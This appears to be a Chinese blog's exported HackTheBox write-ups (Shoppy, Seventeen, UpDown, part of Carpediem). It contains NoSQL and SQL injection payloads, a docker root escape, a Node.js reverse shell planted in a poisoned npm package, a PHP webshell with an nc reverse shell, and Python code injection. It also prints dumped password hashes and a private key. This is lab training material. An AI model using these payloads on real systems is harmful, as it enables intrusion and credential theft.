shadow12root:$6$y5QrvfE3csMMok1t$DvYGED3VsftC3ylIHA8yGVg2j2KiP7uooPn309LahXXPEZulnVWBwwKLorPdiW5snCgWEYN6F24b8LQALG1CD1:19081:0:99999:7:::hflaccus:$6$Y3pKa50HWcGkr&#x2F;KE$ZBG57pq5RIwDs9l75xJMz5Cv2SweVTFOcsv3WzRLC9c&#x2F;QRX7wSgNT&#x2F;XekUYExD30WTZiCHYhLg25mSTRgoZlT.:19083:0:99999:7::: 参考资料 V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMShttps://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS Escaping Docker Privileged Containers | by Vickie Li | Better Programminghttps://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1 Carpediem - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Carpediem-HTB-Discussion Writeup Carpediem HackTheBoxhttps://gatogamer1155.github.io/hackthebox/carpediem/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Shoppy - HackTheBox","slug":"Shoppy-HackTheBox","date":"2022-09-23T07:49:36.000Z","updated":"2023-01-16T00:51:41.326Z","comments":true,"path":"2022/09/23/Shoppy-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/23/Shoppy-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/496 10.10.11.180 端口扫描22,80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.180Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-23 14:50 CSTNmap scan report for 10.10.11.180Host is up (0.20s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)| 256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)|_ 256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)80/tcp open http nginx 1.23.1|_http-title: Did not follow redirect to http://shoppy.htb|_http-server-header: nginx/1.23.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 68.53 seconds 80需要加hosts 110.10.11.180 shoppy.htb Wait page,还没正式开放： 子域名扫描子域名可以发现mattermost,这里对字典稍微有点要求： 123gobuster vhost -u http://shoppy.htb -w ~/Tools/dict/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txtFound: mattermost.shoppy.htb (Status: 200) [Size: 3122] 目录扫描简单的扫描或者常规手工枚举可以发现login: NoSQL注入登录那里存在注入，但不是普通sql注入，而是NoSQL注入： NoSQL injection - HackTrickshttps://book.hacktricks.xyz/pentesting-web/nosql-injection 1admin&#39;||&#39;&#39;&#x3D;&#x3D;&#39; search功能使用同样的payload搜索，结果中得到密码hash,可以解出来josh的密码： 123[&#123;\"_id\":\"62db0e93d6d6a999a66ee67a\",\"username\":\"admin\",\"password\":\"23c6877d9e2b564ef8b32c3a23de27b2\"&#125;,&#123;\"_id\":\"62db0e93d6d6a999a66ee67b\",\"username\":\"josh\",\"password\":\"6ebcea65320589ca4f2f1ce039975995\"&#125;]josh : remembermethisway mattermost得到的josh账号密码可以登录mattermost,在其中一个频道中得到jaeger账号密码： 12username: jaegerpassword: Sh0ppyBest@pp! user flag得到的jaeger用户ssh登录： 提权信息上面信息可以看到是需要先到deploy用户，这个程序strings没什么有用信息，但直接cat再结合尝试运行的报错信息，能够得到密码,没错，密码就是Sample： deploy使用密码运行程序，得到deploy的密码： 切换到deploy用户，发现当前用户在docker组中，那就是常规的docker挂载提权： 提权 &amp; root flag docker | GTFOBinshttps://gtfobins.github.io/gtfobins/docker/ 1docker run -v /:/mnt --rm -it alpine chroot /mnt sh shadow123root:$y$j9T$0gd6YLeK1QF8eXOhAGmb2.$rvSHnH5qysjj79l0OiXizdnFwT1vsQzz5U4p&#x2F;vrHQMB:19195:0:99999:7:::jaeger:$y$j9T$Dd.LPLKhUiqLImmrThQ.m&#x2F;$zWTCxncUITpaG1GhvvV66fhFWRh2CVz.KtJH4bd1ke.:19195:0:99999:7:::deploy:$y$j9T$1u25BMNE1Y2tRYy7ne.wg&#x2F;$mHEZ.4Y9kanC0001s.p5Q8qqzwt9TYgj6nrvaqDlPcB:19195:0:99999:7::: 参考资料 NoSQL injection - HackTrickshttps://book.hacktricks.xyz/pentesting-web/nosql-injection docker | GTFOBinshttps://gtfobins.github.io/gtfobins/docker/ Shoppy - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Shoppy-HTB-Discussion HackTheBox (HTB) Writeup: Shoppy [Easy] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/09/21/hackthebox-htb-writeup-shoppy-easy/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Seventeen - HackTheBox","slug":"Seventeen-HackTheBox","date":"2022-09-19T06:12:45.000Z","updated":"2022-09-26T01:08:37.171Z","comments":true,"path":"2022/09/19/Seventeen-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/19/Seventeen-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/473 10.10.11.165 端口扫描22,80,8000: 123456789101112131415161718192021$ nmap -sC -sV -Pn 10.10.11.165Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-18 23:15 CSTNmap scan report for 10.10.11.165Host is up (0.41s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 2eb26ebb927d5e6b3693171a8209e464 (RSA)| 256 1f57c653fc2d8b517d304202a4d65f44 (ECDSA)|_ 256 d5a5363819fe0d677916e6da1791ebad (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Let's begin your education with us!8000/tcp open http Apache httpd 2.4.38|_http-server-header: Apache/2.4.38 (Debian)|_http-title: 403 ForbiddenService Info: Host: 172.17.0.4; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 133.21 seconds 80一个教育相关的,可以得到对应域名： 12$ curl -s 10.10.11.165 | grep seventeen | html2text | head -n1seventeen.htb 8000直接访问是403: 子域名扫描添加hosts后扫描子域名，发现exam： 1234510.10.11.165 seventeen.htbgobuster vhost -u http://seventeen.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txtFound: exam.seventeen.htb (Status: 200) [Size: 17375] exam.seventeen.htb一个考试管理系统： sql注入exam系统搜索发现sql注入： Exam Reviewer Management System 1.0 - ‘id’ SQL Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/50725 1234567sqlmap -u \"http://exam.seventeen.htb/?p=take_exam&amp;id=1\" --batch -dbsavailable databases [4]:[*] db_sfms[*] erms_db[*] information_schema[*] roundcubedb 信息dump数据库，sfms student表中得到一个账号密码,erms user中以及oldmanagement路径： 1234567891011121314151617181920212223242526272829303132sqlmap -u \"http://exam.seventeen.htb/?p=take_exam&amp;id=1\" --batch -D db_sfms --dumpDatabase: db_sfms[3 tables]+---------+| user || storage || student |+---------+Database: db_sfmsTable: student[4 entries]+---------+----+--------+---------+----------+----------------------------------------------------+-----------+| stud_id | yr | gender | stud_no | lastname | password | firstname |+---------+----+--------+---------+----------+----------------------------------------------------+-----------+| 1 | 1A | Male | 12345 | Smith | 1a40620f9a4ed6cb8d81a1d365559233 | John || 2 | 2B | Male | 23347 | Mille | abb635c915b0cc296e071e8d76e9060c | James || 3 | 2C | Female | 31234 | Shane | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly || 4 | 3C | Female | 43347 | Hales | a1428092eb55781de5eb4fd5e2ceb835 | Jamie |+---------+----+--------+---------+----------+----------------------------------------------------+-----------+Database: erms_dbTable: users[3 entries]+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+| id | type | avatar | lastname | password | username | firstname | date_added | last_login | date_updated |+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+| 1 | 1 | ../oldmanagement/files/avatar.png | Admin | fc8ec7b43523e186a27f46957818391c | admin | Adminstrator | 2021-01-20 14:02:37 | NULL | 2022-02-24 22:00:15 || 6 | 2 | ../oldmanagement/files/avatar.png | Anthony | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark | 2021-09-30 16:34:02 | NULL | 2022-05-10 08:21:39 || 7 | 2 | ../oldmanagement/files/avatar.png | Smith | 184fe92824bea12486ae9a56050228ee | Stev1992 | Steven | 2022-02-22 21:05:07 | NULL | 2022-02-24 22:00:24 |+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+ oldmanagement这个路径是8000端口的，使用得到的账号密码登录，发现文件上传功能： webshell直接上传是在学生id目录下不解析，修改一下传到上层目录即可： reverse shell 信息php文件中得到账号密码： 12345678910111213141516171819www-data@5ec5dfc2216b:/var/www/html/employeemanagementsystem/process$ cat dbh.php&lt;/html/employeemanagementsystem/process$ cat dbh.php&lt;?php$servername = \"localhost\";$dBUsername = \"root\";$dbPassword = \"2020bestyearofmylife\";$dBName = \"ems\";$conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);if(!$conn)&#123; echo \"Databese Connection Failed\";&#125;?&gt;www-data@5ec5dfc2216b:/var/www/html/employeemanagementsystem/process$ pwdpwd/var/www/html/employeemanagementsystem/process 查看用户信息发现mark： 1234www-data@5ec5dfc2216b:/var/www$ cat /etc/passwd | grep sh$cat /etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashmark:x:1000:1000:,,,:/var/www/html:/bin/bash user flagmark用户密码就是数据库密码，ssh登录： kavi再次检查，会发现kavi： 1234mark@seventeen:/var/www/html$ cat /etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashkavi:x:1000:1000:kavi:/home/kavi:/bin/bashmark:x:1001:1001:,,,:/home/mark:/bin/bash opt目录下发现一个nodejs应用，安装有一些模块，但我们没有读权限 查看端口发现4873， 搜索资料发现是Verdaccio的端口： What is Verdaccio? | Verdacciohttps://verdaccio.org/docs/what-is-verdaccio 123mark@seventeen:/tmp$ ss -tunlptcp LISTEN 0 128 127.0.0.1:4873 0.0.0.0:* 所以这些很可能是私有npm模块，我们可以尝试以当前用户安装这些模块，查看其中内容 db-logger直接npm安装对应模块，查看内容，在其中发现一个密码： 123456789101112131415161718192021222324252627282930npm --registry http://127.0.0.1:4873 info db-loggernpm --registry http://127.0.0.1:4873 install db-loggermark@seventeen:/tmp$ cd node_modules/db-logger/mark@seventeen:/tmp/node_modules/db-logger$ lslogger.js package.jsonmark@seventeen:/tmp/node_modules/db-logger$ cat logger.jsvar mysql = require('mysql');var con = mysql.createConnection(&#123; host: \"localhost\", user: \"root\", password: \"IhateMathematics123#\", database: \"logger\"&#125;);function log(msg) &#123; con.connect(function(err) &#123; if (err) throw err; var date = Date(); var sql = `INSERT INTO logs (time, msg) VALUES ($&#123;date&#125;, $&#123;msg&#125;);`; con.query(sql, function (err, result) &#123; if (err) throw err; console.log(\"[+] Logged\"); &#125;); &#125;);&#125;;module.exports.log = log kavi again得到的密码就是kavi密码，ssh登录： 提权信息根据上面的显示结果，查看对应文件内容，发现是安装两个模块后运行app，loglevel原本是没有安装的，运行后会安装，如果我们修改kavi用户的npmrc文件，即可控制安装来源，从而安装恶意模块，然后以root身份被执行： 提权 &amp; root flag根据文档自己本地npm package server，托管恶意模块： verdaccio/verdaccio: 📦🔐 A lightweight Node.js private proxy registryhttps://github.com/verdaccio/verdaccio 12345678910111213141516# 启动servernpm install --global verdaccioverdaccio --listen 0.0.0.0:4873# 制作package# server上原本package下载下来修改kavi@seventeen:/tmp/miao$ npm install loglevelkavi@seventeen:/tmp/miao/node_modules$ zip -r ./loglevel.zip loglevel/*nano lib/loglevel.js# 在开头添加恶意代码npm adduser --registry http://localhost:4873npm login --registry http://localhost:4873npm unpublish --force --registry http://localhost:4873npm publish --registry http://localhost:4873 然后运行，恶意模块被安装，代码被执行，得到root： evil code123456789101112(function()&#123; var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/bash\", []); var client = new net.Socket(); client.connect(4444, \"10.10.14.19\", function()&#123; client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); &#125;); return /a/; // Prevents the Node.js application from crashing&#125;)(); shadow123root:$6$zKJAdLXN$2q2KQQs7CNXr6p.GJAuzESBeX97RB2cdQID4hUUv12CIZvEhCATo8JqsvzVghUlHGVfHXgAuWIVE.GtdVVZPw.:19092:0:99999:7:::kavi:$6$p67ISnef$mypsB6eaLk.iD7WzNHdnZBoKO1O1OgIE1E6pQ.7LidVs4O7TYNvnMkEMVFYXTrmxazGhMHf07HTwFyySxhY.V.:19092:0:99999:7:::mark:$6$wQBYfx4H$H65tyKF3GL&#x2F;61g4gr02xDnu5R4NerpbwhjO5ySUwx8Z701bfRLpXTli79hG67okVJQ6wlueO5NYWCVLONguxU1:19092:0:99999:7::: 参考资料 Exam Reviewer Management System 1.0 - ‘id’ SQL Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/50725 What is Verdaccio? | Verdacciohttps://verdaccio.org/docs/what-is-verdaccio verdaccio/verdaccio: 📦🔐 A lightweight Node.js private proxy registryhttps://github.com/verdaccio/verdaccio Seventeen - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Seventeen-HTB-Discussion Writeup Seventeen HackTheBoxhttps://gatogamer1155.github.io/hackthebox/seventeen/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"UpDown - HackTheBox","slug":"UpDown-HackTheBox","date":"2022-09-13T13:18:48.000Z","updated":"2023-08-11T05:33:45.456Z","comments":true,"path":"2022/09/13/UpDown-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/13/UpDown-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/493 10.10.11.177 端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.11.177Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-13 20:19 CSTNmap scan report for 10.10.11.177Host is up (0.33s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)| 256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)|_ 256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Is my Website up ?|_http-server-header: Apache/2.4.41 (Ubuntu)2043/tcp filtered isis-bcast8100/tcp filtered xprint-serverService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 108.98 seconds 80在线检查其他网站状态： 子域名得到的域名加hosts，继续探测子域名： 110.10.11.177 siteisup.htb 发现dev子域名： 123gobuster vhost -u http://siteisup.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txtFound: dev.siteisup.htb (Status: 403) [Size: 281] 直接访问是403: 目录扫描目录扫描也发现有个dev： 123gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://siteisup.htb/dev (Status: 301) [Size: 310] [--&gt; http://siteisup.htb/dev/] dev直接访问是空白页面，继续扫描发现git泄漏： 1234gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://siteisup.htb/dev//.git/HEAD (Status: 200) [Size: 21]/index.php (Status: 200) [Size: 0] git泄漏dump下载，查看log发现一些信息： 1git-dumper http://siteisup.htb/dev/.git/ git_dump dev那边直接访问是403，这个提示我们需要特殊的header 查看diff，得到信息： 12345678910git diff 8812785e31c879261050e72e20f298ae8c43b565 bc4ba79e596e9fd98f1b2837b9bd3548d04fe7abdiff --git a/.htaccess b/.htaccessindex b317ab5..44ff240 100644--- a/.htaccess+++ b/.htaccess@@ -2,4 +2,3 @@ SetEnvIfNoCase Special-Dev \"only4dev\" Required-Header Order Deny,Allow Deny from All Allow from env=Required-Header 根据信息，添加header，测试访问dev成功： 1curl http://dev.siteisup.htb -H \"Special-Dev: only4dev\" dev.siteisup.htbburp里加条规则自动加header，后续方便操作： 文件上传有个上传点，相关代码也都在之前的gitdump里可以得到, 代码里可以看到各种检查，是一个上传文件批量检查文件内容中站点状态的功能 这里可以利用phar文件，让我们创建一个包含大量站点的 .phar 文件，以便我们有足够的时间浏览我们上传的文件。我们在 RCE 文件的末尾包含了一些 php 代码。然后，我们上传文件。最后，当 checker.php 忙于检查站点时，我们浏览到上传的文件以执行代码。 上传文件，然后浏览到http://dev.siteisup.htb/uploads/，可以看到临时文件夹md5，然后浏览到那个文件夹，点击上传的文件，得到php代码执行结果 webshell存在大量disable_function，但没有禁用proc_open： PHP: proc_open - Manualhttps://www.php.net/manual/en/function.proc-open.php phpinfo.phar12345678910http:&#x2F;&#x2F;dev.siteisup.htbhttp:&#x2F;&#x2F;dev.siteisup.htbhttp:&#x2F;&#x2F;dev.siteisup.htbhttp:&#x2F;&#x2F;dev.siteisup.htb...http:&#x2F;&#x2F;dev.siteisup.htb# 100行&lt;?phpphpinfo();?&gt; shell.phar12345678910111213141516171819202122232425262728# 大量hosts&lt;?php$descriptorspec &#x3D; array( 0 &#x3D;&gt; array(&quot;pipe&quot;, &quot;r&quot;), &#x2F;&#x2F; stdin is a pipe that the child will read from 1 &#x3D;&gt; array(&quot;pipe&quot;, &quot;w&quot;), &#x2F;&#x2F; stdout is a pipe that the child will write to 2 &#x3D;&gt; array(&quot;file&quot;, &quot;&#x2F;tmp&#x2F;error-output.txt&quot;, &quot;a&quot;) &#x2F;&#x2F; stderr is a file to write to);$process &#x3D; proc_open(&quot;sh&quot;, $descriptorspec, $pipes);if (is_resource($process)) &#123; &#x2F;&#x2F; $pipes now looks like this: &#x2F;&#x2F; 0 &#x3D;&gt; writeable handle connected to child stdin &#x2F;&#x2F; 1 &#x3D;&gt; readable handle connected to child stdout &#x2F;&#x2F; Any error output will be appended to &#x2F;tmp&#x2F;error-output.txt fwrite($pipes[0], &quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|sh -i 2&gt;&amp;1|nc 10.10.14.8 4444 &gt;&#x2F;tmp&#x2F;f&quot;); fclose($pipes[0]); while (!feof($pipes[1])) &#123; echo fgets($pipes[1], 1024); &#125; fclose($pipes[1]); &#x2F;&#x2F; It is important that you close any pipes before calling &#x2F;&#x2F; proc_close in order to avoid a deadlock $return_value &#x3D; proc_close($process); echo &quot;command returned $return_value\\n&quot;;&#125;?&gt; checker.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116&lt;?phpif(DIRECTACCESS)&#123; die(&quot;Access Denied&quot;);&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&#39;utf-8&#39; &#x2F;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;chrome&#x3D;1&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; media&#x3D;&quot;screen&quot; href&#x3D;&quot;stylesheet.css&quot;&gt; &lt;title&gt;Is my Website up ? (beta version)&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div id&#x3D;&quot;header_wrap&quot; class&#x3D;&quot;outer&quot;&gt; &lt;header class&#x3D;&quot;inner&quot;&gt; &lt;h1 id&#x3D;&quot;project_title&quot;&gt;Welcome,&lt;br&gt; Is My Website UP ?&lt;&#x2F;h1&gt; &lt;h2 id&#x3D;&quot;project_tagline&quot;&gt;In this version you are able to scan a list of websites !&lt;&#x2F;h2&gt; &lt;&#x2F;header&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;&quot;main_content_wrap&quot; class&#x3D;&quot;outer&quot;&gt; &lt;section id&#x3D;&quot;main_content&quot; class&#x3D;&quot;inner&quot;&gt; &lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label&gt;List of websites to check:&lt;&#x2F;label&gt;&lt;br&gt;&lt;br&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; size&#x3D;&quot;50&quot;&gt; &lt;input name&#x3D;&quot;check&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot;&gt; &lt;&#x2F;form&gt;&lt;?phpfunction isitup($url)&#123; $ch&#x3D;curl_init(); curl_setopt($ch, CURLOPT_URL, trim($url)); curl_setopt($ch, CURLOPT_USERAGENT, &quot;siteisup.htb beta&quot;); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $f &#x3D; curl_exec($ch); $header &#x3D; curl_getinfo($ch); if($f AND $header[&#39;http_code&#39;] &#x3D;&#x3D; 200)&#123; return array(true,$f); &#125;else&#123; return false; &#125; curl_close($ch);&#125;if($_POST[&#39;check&#39;])&#123; # File size must be less than 10kb. if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 10000) &#123; die(&quot;File too large!&quot;); &#125; $file &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;]; # Check if extension is allowed. $ext &#x3D; getExtension($file); if(preg_match(&quot;&#x2F;php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar&#x2F;i&quot;,$ext))&#123; die(&quot;Extension not allowed!&quot;); &#125; # Create directory to upload our file. $dir &#x3D; &quot;uploads&#x2F;&quot;.md5(time()).&quot;&#x2F;&quot;; if(!is_dir($dir))&#123; mkdir($dir, 0770, true); &#125; # Upload the file. $final_path &#x3D; $dir.$file; move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;&#123;$final_path&#125;&quot;); # Read the uploaded file. $websites &#x3D; explode(&quot;\\n&quot;,file_get_contents($final_path)); foreach($websites as $site)&#123; $site&#x3D;trim($site); if(!preg_match(&quot;#file:&#x2F;&#x2F;#i&quot;,$site) &amp;&amp; !preg_match(&quot;#data:&#x2F;&#x2F;#i&quot;,$site) &amp;&amp; !preg_match(&quot;#ftp:&#x2F;&#x2F;#i&quot;,$site))&#123; $check&#x3D;isitup($site); if($check)&#123; echo &quot;&lt;center&gt;&#123;$site&#125;&lt;br&gt;&lt;font color&#x3D;&#39;green&#39;&gt;is up ^_^&lt;&#x2F;font&gt;&lt;&#x2F;center&gt;&quot;; &#125;else&#123; echo &quot;&lt;center&gt;&#123;$site&#125;&lt;br&gt;&lt;font color&#x3D;&#39;red&#39;&gt;seems to be down :(&lt;&#x2F;font&gt;&lt;&#x2F;center&gt;&quot;; &#125; &#125;else&#123; echo &quot;&lt;center&gt;&lt;font color&#x3D;&#39;red&#39;&gt;Hacking attempt was detected !&lt;&#x2F;font&gt;&lt;&#x2F;center&gt;&quot;; &#125; &#125; # Delete the uploaded file. @unlink($final_path);&#125;function getExtension($file) &#123; $extension &#x3D; strrpos($file,&quot;.&quot;); return ($extension&#x3D;&#x3D;&#x3D;false) ? &quot;&quot; : substr($file,$extension+1);&#125;?&gt; &lt;&#x2F;section&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;&quot;footer_wrap&quot; class&#x3D;&quot;outer&quot;&gt; &lt;footer class&#x3D;&quot;inner&quot;&gt; &lt;p class&#x3D;&quot;copyright&quot;&gt;siteisup.htb (beta)&lt;&#x2F;p&gt;&lt;br&gt; &lt;a class&#x3D;&quot;changelog&quot; href&#x3D;&quot;changelog.txt&quot;&gt;changelog.txt&lt;&#x2F;a&gt;&lt;br&gt; &lt;&#x2F;footer&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; developerdeveloper用户目录发现一个带suid的文件： 查看对应的python文件，发现url是通过input接收后未经过任何过滤，可以通过 __import__ 这种方式执行python代码 代码注入 测试成功,直接读私钥： 12__import__('os').system('id')__import__('os').system('cat /home/developer/.ssh/id_rsa') developer_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw&#x2F;S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAYozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCosrrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+qa+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHuu0nhUpICU1FXr6tV2uE1LIb5TJrCIx479Elbc1MPrGCksQVV8EesI7kk5A2SrnNMxLe2ckIsQHQHxIcivCCIzB4R9FbOKdSKyZTHeZzjPwnU+FAAAFiHnDXHF5w1xxAAAAB3NzaC1yc2EAAAGBAJrweNE1jPHrtJ+hTs4sUwNaUN&#x2F;UqcGMq2Aoyqw7afIORNORBHCcP0taovTxaDb85Le1Mt&#x2F;vusQ3feboAHbbkS+6swNN8UjZKp7dh4IygDzq+nLSLzA6YfCXgRdhfUsuF67Xwj++vlqc5sU+7rbxg9DdQGN&#x2F;hBkaTm+6ufV9KXD0ZyFJ8btrDfryF43xr6ogGKMzgeQ3l&#x2F;K29m5Ioukt0NbTNVVA6Fu3AkW5wTIJZthVxCVPZRL&#x2F;T8tg+AWrxb6FKrU&#x2F;GgqLK6yr06QEJD6734qEobSKaPeRn8segY9jCiekLoYiSvjts2JtM9ro4wl7jN1eCW9CNVHfqmvkLcU7DUFaXCLnLdOsU31V3hLT04WiyOSpFxJcfk4MEdOt948EaX8dXlYCwscWJOQmqR7rtJ4VKSAlNRV6+rVdrhNSyG+UyawiMeO&#x2F;RJW3NTD6xgpLEFVfBHrCO5JOQNkq5zTMS3tnJCLEB0B8SHIrwgiMweEfRWzinUismUx3mc4z8J1PhQAAAAMBAAEAAAGAMhM4KP1ysRlpxhG&#x2F;Q3kl1zaQXtb&#x2F;ilNpa+mjHykQo6+i5PHAipilCDih5CJFeUggr5L7f06egR4iLcebps5tzQw9IPtG2TF+ydt1GUozEf0rtoJhx+eGkdiVWzYh5XNfKh4HZMzD&#x2F;sso9mTRiATkglOPpNiom+hZo1ipE0NBaoVC84pPezAtU4Z8wF51VLmM3Ooft9+T11j0qk4FgPFSxqt6WDRjJIkwTdKsMvzA5XhKrXhMhWhIpMWRQ1vxzBKDa1C0+XEA4w+uUlWJXg&#x2F;SKEAb5jkK2FsfMRyFcnYYq7XV2Okqa0NnwFDHJ23nNE&#x2F;piz14k8ss9xb3edhg1CJdzrMAd3aRwoL2h3Vq4TKnxQY6JrQ&#x2F;3&#x2F;QXd6QvZVSxq4iINxYx&#x2F;wKhpcl5yLD4BCb7cxfZLh8gHSjAu5+L01Ez7E8MPw+VU3QRG4&#x2F;Y47g0cqDHSERme&#x2F;ArptmaqLXDCYrRMh1AP+EPfSEVfifh&#x2F;ftEVhVAbv9LdzJkvUR69Kok5LIhAAAAwCb5o0xFjJbF8PuSasQO7FSW+TIjKH9EV&#x2F;5Uy7BRCpUngxw30L7altfJ6nLGb2a3ZIi66p0QY&#x2F;HBIGREw74gfivt4g+lpPjD23TTMwYuVkr56aoxUIGIX84d&#x2F;HuDTZL9at5gxCvB3oz5VkKpZSWCnbuUVqnSFpHytRgjCx5f+inb++AzR4l2&#x2F;ktrVl6fyiNAAiDs0aurHynsMNUjvON8WLHlBgS6IDcmEqhgXXbEmUTY53WdDhSbHZJo0PF2GRCnNQAAAMEAyuRjcawrbEZgEUXWz3vcoZFjdpU0j9NSGaOyhxMEiFNwmf9xZ96+7xOlcVYoDxelx49LbYDcUq6g2O324qAmRRRtUPADO3MPlUfI0g8qxqWn1VSiQBlUFpw54GIcuSoD0BronWdjicUP0fzVecjkEQ0hp7gugNyFi4s68suDESmL5FCOWUuklrpkNENk7jzjhlzs3gdfU0IRCVpfmiT7LDGwX9YLfsVXtJmtpd5SG55TJuGJqXCyeM+U0DBdxsT5AAAAwQDDfs&#x2F;CULeQUO+2Ij9rWAlKaTEKLkmZjSqB2d9yJVHHzGPe1DZfRu0nYYonz5bfqoAh2GnYwvIp0h3nzzQo2Svv3&#x2F;ugRCQwGoFP1zs1a